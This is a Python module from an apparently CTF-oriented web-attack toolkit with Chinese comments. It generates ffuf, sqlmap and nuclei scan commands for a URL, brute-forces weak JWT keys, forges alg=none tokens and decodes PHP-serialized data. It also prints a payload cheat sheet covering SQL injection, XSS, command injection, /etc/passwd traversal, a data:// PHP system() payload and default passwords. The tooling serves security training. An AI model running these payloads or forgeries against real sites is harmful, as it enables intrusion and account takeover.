# -*- coding: utf-8 -*-
"""
Web 一把梭
-----------
给一个 URL，直接生成可粘贴的命令（路径已指向本包里的字典），
顺便做 URL/Base64/JWT 解码和常见 payload 速查。
"""
import os
import re
import json
import hmac
import base64
import hashlib
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
# 工具根目录（字典包放在根目录下）
ROOT = os.path.abspath(os.path.join(HERE, ".."))

try:
    import crypto as _crypto
except Exception:
    try:
        from . import crypto as _crypto
    except Exception:
        _crypto = None


def _FLAG_PAT_B():
    """flag 格式可配置（见 core/flagfmt.py）"""
    try:
        import flagfmt
        return flagfmt.pattern_bytes()
    except Exception:
        return rb"[A-Za-z0-9_]{0,12}[Ff][Ll][Aa][Gg][A-Za-z0-9_]{0,12}\{[^}\r\n\x00]{1,120}\}"


def _FLAG_PAT_S():
    """flag 格式可配置（见 core/flagfmt.py）"""
    try:
        import flagfmt
        return flagfmt.pattern_str()
    except Exception:
        return r"[A-Za-z0-9_]{0,12}[Ff][Ll][Aa][Gg][A-Za-z0-9_]{0,12}\{[^}\r\n]{1,120}\}"

def dict_path(*parts):
    p = os.path.join(ROOT, "字典包", *parts)
    return p if os.path.exists(p) else ""


def common_dict():
    for name in ("common.txt", "raft-small-words.txt", "directory-list-2.3-medium.txt"):
        p = dict_path("目录字典", name)
        if p:
            return p
    return ""


def pass_dict():
    for name in ("10k-most-common.txt", "rockyou-75.txt", "rockyou.txt"):
        p = dict_path("密码字典", name)
        if p:
            return p
    return ""


# ------------------------------------------------------------------ 解码
# JWT 弱密钥字典（CTF 里 90% 的 HS256 题都在这里面）
JWT_WORDS = """
secret key password 123456 12345678 1234567890 admin administrator root
jwt jwtsecret jwt_secret jwtkey jwt_key secretkey secret_key mysecret my_secret
test testing test123 dev development debug default changeme change_me letmein
qwerty abc123 iloveyou monkey dragon master welcome login user guest
supersecret super_secret topsecret top_secret private privatekey
s3cr3t s3cret p@ssw0rd Passw0rd password123 admin123 root123
flag ctf ctfhub buu nssctf hgame moectf iscc
thisisasecret this_is_a_secret mykey my_key sign signing signature token
app apps api apikey api_key access access_token refresh
ctfshow dasctf xctf
""".split()


def _b64url_decode(s):
    return base64.urlsafe_b64decode(s + "=" * ((-len(s)) % 4))


def _b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def jwt_crack(tok, words=None):
    """
    JWT 弱密钥爆破（只对 HS256/HS384/HS512 有效）。
    返回提示行列表。
    """
    parts = tok.split(".")
    if len(parts) != 3:
        return []
    try:
        hdr = json.loads(_b64url_decode(parts[0]))
    except Exception:
        return []
    alg = (hdr.get("alg") or "").upper()
    digests = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    if alg not in digests:
        out = [f"alg = {alg or '未知'}，不是对称算法，弱密钥爆破不适用。"]
        # alg=none：JWT 最经典的漏洞，服务端不校验签名就能伪造任意 payload
        if alg in ("NONE", "NULL", ""):
            out = ["★ alg = none —— JWT 最经典的漏洞"]
            out.append("   攻击：header 里 alg 改成 none、签名段留空，"
                       "服务端若没校验签名就能伪造任意 payload。")
            out.append("   伪造后的 token（直接拿去用）：")
            out.append("     " + parts[0] + "." + parts[1] + ".")
            out.append("   还可以试大小写变形：None / NONE / nOnE")
            return out
        if alg.startswith("RS") or alg.startswith("ES"):
            out.append("  但这题可能是「RS256 → HS256 混淆」：把 alg 改成 HS256，"
                       "用公钥内容当 HMAC 密钥重新签名，服务端会认。")
        return out

    msg = (parts[0] + "." + parts[1]).encode()
    sig = parts[2]
    dg = digests[alg]
    tried = 0
    for w in (words or JWT_WORDS):
        tried += 1
        calc = _b64url_encode(hmac.new(w.encode("utf-8", "ignore"), msg, dg).digest())
        if hmac.compare_digest(calc, sig):
            return [f"★ 弱密钥命中：{w!r}（试了 {tried} 个）",
                    "  现在可以自己签发任意 payload 了，比如把 role 改成 admin"]
    # 空密钥
    calc = _b64url_encode(hmac.new(b"", msg, dg).digest())
    if hmac.compare_digest(calc, sig):
        return ["★ 密钥是空字符串！"]

    out = [f"试了 {tried} 个常见密钥，没命中。",
           "  下一步：拿 jwt_tool 配大字典跑 —— python jwt_tool.py <token> -C -d 字典"]
    # alg:none 伪造提示
    none_tok = (_b64url_encode(json.dumps({"alg": "none", "typ": "JWT"},
                                          separators=(",", ":")).encode())
                + "." + parts[1] + ".")
    out.append("  顺手生成 alg=none 版本（把签名段留空，很多题直接过）：")
    out.append("    " + none_tok)
    return out


# ---------------------------------------------------------- PHP 反序列化
PHP_SER_RE = re.compile(rb'(?:^|[^\w])(?:a|O|s|i|b|d|N):')


def php_serialized(text):
    """
    识别并「展开」PHP 序列化数据（常见于 cookie / 参数 / 隐藏字段）。
    不追求完整还原对象，重点是把里面所有字符串抽出来 —— flag 通常就在里面。
    返回 [(说明, 内容)]
    """
    t = text.strip()
    if not t:
        return []
    out = []
    # 直接是序列化串
    cands = [("原文", t)]
    # 常见：base64 后再序列化
    b = re.sub(r"\s+", "", t)
    try:
        d = base64.b64decode(b + "=" * ((-len(b)) % 4)).decode("utf-8", "ignore")
        if PHP_SER_RE.search(d.encode("utf-8", "ignore")):
            cands.append(("Base64 解开后", d))
    except Exception:
        pass
    # URL 编码
    try:
        d = urllib.parse.unquote(t)
        if d != t and PHP_SER_RE.search(d.encode("utf-8", "ignore")):
            cands.append(("URL 解码后", d))
    except Exception:
        pass

    for how, s0 in cands:
        if not PHP_SER_RE.search(s0.encode("utf-8", "ignore")):
            continue
        strings = _php_strings(s0)
        if not strings:
            continue
        out.append((how, " | ".join(strings[:30])))
        # 完整展开（含结构）
        out.append((how + "（结构）", _php_pretty(s0)[:2000]))
        break
    return out


def _php_strings(s):
    """抽出所有 s:LEN:"..." 里的字符串"""
    res = []
    for m in re.finditer(r's:(\d+):"', s):
        ln = int(m.group(1))
        start = m.end()
        val = s[start:start + ln]
        if val:
            res.append(val)
    return res


def _php_pretty(s):
    """把序列化串排成可读的多行形式"""
    out = []
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c == "s" and s[i:i + 2] == "s:":
            m = re.match(r's:(\d+):"', s[i:])
            if not m:
                break
            ln = int(m.group(1))
            st = i + m.end()
            val = s[st:st + ln]
            out.append(f'  "{val}"')
            i = st + ln + 2
            continue
        if c == "i" and s[i:i + 2] == "i:":
            m = re.match(r'i:(-?\d+);', s[i:])
            if m:
                out.append(f"  {m.group(1)}")
                i += m.end()
                continue
        if c == "O" and s[i:i + 2] == "O:":
            m = re.match(r'O:(\d+):"', s[i:])
            if m:
                ln = int(m.group(1))
                st = i + m.end()
                cls = s[st:st + ln]
                out.append(f"对象 {cls} {{")
                i = st + ln + 2
                continue
        if c == "}":
            out.append("}")
            i += 1
            continue
        i += 1
    return "\n".join(out)


def decode_jwt(tok):
    parts = tok.split(".")
    if len(parts) != 3:
        return None
    out = []
    for i, name in ((0, "Header"), (1, "Payload")):
        s = parts[i] + "=" * ((-len(parts[i])) % 4)
        try:
            b = base64.urlsafe_b64decode(s)
            out.append(f"{name}: {b.decode('utf-8', 'replace')}")
        except Exception:
            out.append(f"{name}: 解码失败")
    return out


def parse_url(u):
    L = []
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", u):
        u = "http://" + u
    p = urllib.parse.urlparse(u)
    L.append(f"协议：{p.scheme}")
    L.append(f"主机：{p.hostname}" + (f"   端口：{p.port}" if p.port else ""))
    L.append(f"路径：{p.path or '/'}")
    if p.query:
        L.append("参数（每个都可能是注入点）：")
        for k, v in urllib.parse.parse_qsl(p.query, keep_blank_values=True):
            hint = ""
            if re.fullmatch(r"\d+", v):
                hint = "  ← 数字，试 SQLi / IDOR"
            elif v.endswith("=") or v == "":
                hint = "  ← 空值，试文件包含 / SSRF"
            L.append(f"    {k} = {v}{hint}")
    return L, u


def payloads():
    return """== SQLi 常用 ==
' OR '1'='1
' OR 1=1-- -
admin' -- -
1' UNION SELECT 1,2,3-- -
1' AND SLEEP(5)-- -
1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -

== XSS 常用 ==
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
javascript:alert(1)

== 命令注入 ==
;id
|id
`id`
$(id)
%0aid
;cat /flag

== 文件包含 / 穿越 ==
../../../../etc/passwd
....//....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

== SSTI 探测 ==
{{7*7}}
${7*7}
<%= 7*7 %>
{{config}}
{{''.__class__.__mro__}}

== 常见弱口令 ==
admin/admin  admin/123456  admin/admin888  root/root  test/test
"""


def commands(url):
    d = common_dict()
    pd = pass_dict()
    host = urllib.parse.urlparse(url).netloc or url
    scheme = urllib.parse.urlparse(url).scheme or "http"
    base = f"{scheme}://{host}"
    L = []
    L.append("== 目录扫描（ffuf，最快）==")
    if d:
        L.append(f'ffuf -u {base}/FUZZ -w "{d}" -mc 200,301,302,403 -t 40')
    else:
        L.append(f"ffuf -u {base}/FUZZ -w 字典路径\\common.txt -mc 200,301,302,403")
    L.append("")
    L.append("== 目录扫描（dirsearch，有进度条）==")
    if d:
        L.append(f'dirsearch -u {base} -w "{d}" -e php,html,js,txt,zip,bak --exclude-status 404')
    L.append("")
    L.append("== 指纹 / 漏洞模板（nuclei，需模板已缓存）==")
    L.append(f'nuclei -u {base} -nt -severity low,medium,high,critical')
    L.append("")
    L.append("== 单页快查（curl，看响应头/跳转/备份文件）==")
    L.append(f'curl -i -s {url}')
    L.append(f'curl -s {base}/robots.txt')
    L.append(f'curl -s {base}/www.zip -o www.zip')
    L.append("")
    L.append("== SQL 注入（sqlmap，先跑基础，别一上来就 --dump）==")
    L.append(f'sqlmap -u "{url}" --batch --dbs')
    if pd:
        L.append(f'sqlmap -u "{url}" --batch -r request.txt   # 有 POST 时用 -r')
    L.append("")
    L.append("== 备份/源码泄露常见路径 ==")
    for p in ("www.zip", "wwwroot.zip", "web.zip", "backup.zip", ".git/HEAD",
              ".svn/entries", "index.php.bak", "index.php~", "flag.php", "robots.txt"):
        L.append("  " + p)
    return L


def chain_decode(text, depth=5, label=""):
    """多轮解码：一段字符串可能是 URL→Base64→凯撒… 组合，直接交给 crypto 引擎"""
    if _crypto is None or not text or len(text) > 20000:
        return []
    try:
        r = _crypto.solve(text, max_depth=depth)
    except Exception:
        return []
    out = []
    for chain, f in r["hits"]:
        out.append(f"{label}★ 解出：{f}    ← {chain}")
    if not r["hits"]:
        for d, t, s in r["results"][:3]:
            if s >= 6:
                out.append(f"{label}候选（{s:.1f}）：{t.replace(chr(10),' ')[:110]}    ← {d}")
    return out


def analyze(text):
    rep = {"lines": [], "warn": [], "hits": []}
    t = text.strip()
    if not t:
        return rep
    L = rep["lines"]

    # 如果输入是一个 URL，就直接真发请求（GET / POST + 伪造本地 IP）
    if re.match(r"^https?://", t, re.I):
        L.append("== 真发请求（GET / POST + 伪造本地 IP）==")
        try:
            import webreq
            import misc as _misc
            for line in webreq.probe_url(t, find_flags=_misc.find_flags_in):
                L.append(line)
                if "★ 回显里有 flag：" in line:
                    rep["hits"].append(line.split("flag：", 1)[1].strip())
        except Exception as e:
            L.append(f"  （真发请求失败：{e}）")
        L.append("")

    # JWT
    is_jwt = bool(re.fullmatch(r"[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*", t))
    if is_jwt:
        L.append("== 识别为 JWT ==")
        L += decode_jwt(t) or []
        L.append("")
        L.append("== 弱密钥爆破 ==")
        L += jwt_crack(t)
        L.append("")

    # PHP 反序列化（cookie / 参数里塞序列化数据是高频套路）
    try:
        ps = php_serialized(t)
        if ps:
            L.append("== PHP 反序列化 ==")
            for how, content in ps[:2]:
                L.append(f"  [{how}]")
                for line in content.splitlines()[:20]:
                    L.append("    " + line[:160])
            L.append("")
    except Exception:
        pass

    # 多轮解码（Web 题里常见的 cookie / token / 参数值，往往是好几层编码套起来的）
    # JWT 已经在上面单独处理过，再丢进多轮搜索纯属浪费时间（一段 token 要跑好几秒）
    if not is_jwt and not t.startswith("http") and " " not in t and len(t) > 6:
        multi = chain_decode(t, depth=5)
        if multi:
            L.append("== 多轮解码 ==")
            L += multi
            L.append("")

    # 编码混合
    if "%" in t:
        L.append("== URL 解码 ==")
        L.append("  " + urllib.parse.unquote(t)[:300])
        L.append("")

    if re.fullmatch(r"[A-Za-z0-9+/=\s]+", t) and len(t) % 4 == 0 and len(t) > 8:
        try:
            b = base64.b64decode(t + "=" * ((-len(t)) % 4))
            L.append("== Base64 解码 ==")
            L.append("  " + b.decode("utf-8", "replace")[:300])
            L.append("")
        except Exception:
            pass

    # 当作 URL 处理 —— 只认明确的 http(s)://，
    # 否则 JWT（a.b.c）和 PHP 序列化串也会被当成域名解析
    if re.match(r"^https?://", t, re.I) and " " not in t:
        parsed, norm = parse_url(t)
        L.append("== 目标解析 ==")
        L += parsed
        L.append("")
        # 每个参数值都过一遍多轮解码（很多题把 flag 藏在参数里）
        try:
            q = urllib.parse.urlparse(norm).query
            for k, v in urllib.parse.parse_qsl(q, keep_blank_values=True):
                if v and len(v) > 6:
                    hits = chain_decode(v, depth=4, label=f"参数 {k}：")
                    if hits:
                        L.append(f"== 参数 {k} 的解码结果 ==")
                        L += hits
                        L.append("")
        except Exception:
            pass
        L += commands(norm)

    # 找 flag
    for m in re.finditer(_FLAG_PAT_S(), t):
        rep["hits"].append(m.group())

    if not L:
        L.append("输入不是 URL / JWT / Base64。")
    L.append("")
    L.append(payloads())
    return rep
